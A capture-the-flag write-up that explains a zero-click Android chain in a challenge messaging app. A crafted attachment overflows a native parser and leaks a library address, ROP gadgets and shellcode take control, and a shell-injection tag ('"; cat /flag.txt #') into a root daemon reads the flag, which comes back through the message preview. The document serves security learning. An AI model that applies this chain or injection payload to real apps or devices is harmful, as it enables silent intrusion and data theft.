# Whisper writeup

## tl;dr

Whisper is a zero-click Android pwn challenge. We send the victim a crafted chat attachment. The victim app automatically previews the attachment, and one native parser has a bug that lets us run code inside the app. From there we talk to a root daemon called `whisperd`, abuse a command injection bug, and read `/flag.txt`.

Remote flag:

```text
r3ctf{WhISPer-W@_0T0-Mo_n@kU_TOd0Ku_mONo_D@_Yo-t4Pl3S51y_zero_interaction_de_shinnyuu_dekita_ne_congrats0}
```

## Challenge setup in plain English

The provided files contain a mini messaging service:

- a backend API/WebSocket server,
- an Android app called Whisper,
- a victim Android emulator,
- and a custom Android system image with some root daemons.

The attacker is just a normal user on the messaging backend. The target is the victim account. The important behavior is that when the victim receives an attachment, the Android app automatically downloads and parses it to generate a message preview. No tap is needed, so this is a zero-click attack surface.

The app supports several attachment kinds:

```text
imgcard       -> libwhisperimg.so
stickercard   -> libwhispersticker.so
pollcard      -> libwhisperpoll.so
rcard         -> libwhispermedia.so
voicecard     -> libwhispervoice.so
fxcard        -> libwhisperfx.so
```

Most of these native parsers are decoys. The vulnerable one is:

```text
kind = rcard
library = libwhispermedia.so
```

The preview result is also very useful for us. Whatever title/subtitle the native parser returns gets posted back to the backend, and since we are in the same conversation, we receive that preview over WebSocket. That means the preview is both a leak channel and a flag exfil channel.

## First useful bug: `rcard` parser memory corruption

The `rcard` format is simple:

```text
'RCRD' | u16 version | u32 fieldCount | fields... | trailer

field = u8 tag | u16 length | data[length]
```

The parser reads `fieldCount` from the file and trusts it too much.

Internally it allocates a heap chunk for field entries. Each entry is 16 bytes. Later, in that same chunk, the program stores a small dispatch structure containing a function pointer. The bug is that the parser keeps writing field entries past the end of the entry area, so high-numbered fields overwrite the dispatch structure.

The interesting final code path does roughly this:

```c
rdi = *(base + 0x118);
call *(rdi + 0x10);
```

By sending 18 fields, field number 17 overwrites `base+0x118` with a pointer to attacker-controlled data. Then `[rdi+0x10]` is also attacker-controlled.

So we get:

```text
call attacker_chosen_address
rdi -> attacker-controlled field-17 buffer
```

That is the main code execution primitive.

## ASLR problem

The libraries are PIE, so addresses are randomized. We need a leak before we can jump to useful gadgets.

Luckily, the challenge intentionally provides a leak path in the same `rcard` parser.

There is a special trailer path using:

```text
magic: 0xc0ffee5e
qword: "WREKLAEF"
```

That trailer makes the formatter leak bytes from `base + 0x130`, where the parser has stored the address of an internal formatter function:

```text
formatter = libwhispermedia_base + 0x1d780
```

The bytes are XOR-encoded with a fixed key, then returned as the preview subtitle.

Leak card recipe:

```text
fieldCount = 17
field #16 tag = 8, length = 0
trailer = 0xc0ffee5e + "WREKLAEF"
```

Decode:

```text
leaked_ptr = subtitle_bytes XOR 0xa7c39e15b6428d7f
libwhispermedia_base = leaked_ptr - 0x1d780
```

This was confirmed locally with the emulator harness and then against the live instance.

## Getting code execution cleanly

`libwhispermedia.so` has a very suspicious planted gadget area. The most important gadgets are:

```text
0x1dda0 / 0x1f400  mov rsp, rdi ; ret
0x1f404            pop rdi ; ret
0x1f40a            pop rsi ; ret
0x1f40c            pop rax ; ret
0x1f40e            pop rcx ; ret
0x1f415            mov rax, [rax] ; ret
0x1f419            add rax, rcx ; ret
0x1f424            jmp rax
0x1f42a            mov [rdi], rax ; ret
0x33061            mov edx, eax ; ret
```

The hijacked call target is the stack pivot:

```text
libwhispermedia_base + 0x1dda0
```

Since `rdi` points to our field-17 buffer, `mov rsp, rdi ; ret` turns our attachment data into the ROP stack.

The final exploit does this:

1. Write shellcode into `libwhispermedia` `.bss`.
2. Resolve libc `mprotect` using `calloc@GOT` plus a known offset delta.
3. Call `mprotect` to make `.bss` executable.
4. Jump to the shellcode.

The shellcode is small and uses raw Linux syscalls.

## Second useful bug: root command injection in `whisperd`

The Android system image has a root daemon called `whisperd`. It listens on:

```text
/dev/socket/whisperd
```

It checks that the connecting process is the Whisper app UID, so we cannot call it directly from outside the phone. But after exploiting the parser, our shellcode is running inside the app process, so the UID check passes.

The protocol is:

```text
u32 opcode = 1
u32 tagLen
tag bytes
u32 detailLen
detail bytes
```

`whisperd` then builds a shell command like this:

```sh
echo "diag[<tag>]: <detail>" >> /data/local/tmp/whisper_diag.log 2>/dev/null; getprop | grep -i "<tag>" | head -n 20
```

The tag is placed inside double quotes without escaping. So this tag breaks out and runs our command:

```text
"; cat /flag.txt #
```

The resulting shell command includes:

```sh
cat /flag.txt
```

Because `whisperd` runs as root, this reads the flag. Its stdout is returned to our app process.

## Exfiltrating the flag

After reading the `whisperd` response, the shellcode writes the output into the native result string used by the attachment preview.

Then the app continues normally and posts the preview back to the backend. We receive that preview over WebSocket as the attacker.

So the whole chain is:

```text
crafted rcard attachment
  -> victim auto-parses it
  -> leak lib base through preview subtitle
  -> send second rcard
  -> hijack parser function pointer
  -> ROP + shellcode inside app process
  -> connect to /dev/socket/whisperd
  -> command injection as root
  -> cat /flag.txt
  -> put flag in preview title
  -> attacker receives preview over WebSocket
```

## Remote notes

The challenge landing page only exposed a lease UI. After requesting an instance, it gave a victim handle, but not the backend URL directly.

The downloadable APK had this asset:

```json
{"backend":"http://vm.ctf2026.r3kapig.com:21802","ws":"ws://vm.ctf2026.r3kapig.com:21802"}
```

So the attack was run against that backend and the leased victim handle.

Example command:

```bash
python3 solution/exploit/exploit.py \
  --base http://vm.ctf2026.r3kapig.com:21802 \
  --victim <leased_victim_handle>
```

The successful remote preview was:

```text
diag[
r3ctf{WhISPer-W@_0T0-Mo_n@kU_TOd0Ku_mONo_D@_Yo-t4Pl3S51y_zero_interaction_de_shinnyuu_dekita_ne_congrats0}
```

## Things that were dead ends

A few pieces looked tempting but were not the intended path:

- `libwhisperimg.so`, `libwhisperpoll.so`, `libwhisperfx.so`, `libwhispervoice.so`, and `libwhispersticker.so` were all hardened decoys.
- `whisper_otad` looked interesting because it was root and exposed a socket, but it only allowed safe paths under `/data/ota_package/`.
- `whisper_backupd` also looked interesting, but it required the peer UID to be Android system UID, not the app UID.

The intended route is clearly `rcard -> libwhispermedia -> whisperd`.

## Final flag

```text
r3ctf{WhISPer-W@_0T0-Mo_n@kU_TOd0Ku_mONo_D@_Yo-t4Pl3S51y_zero_interaction_de_shinnyuu_dekita_ne_congrats0}
```
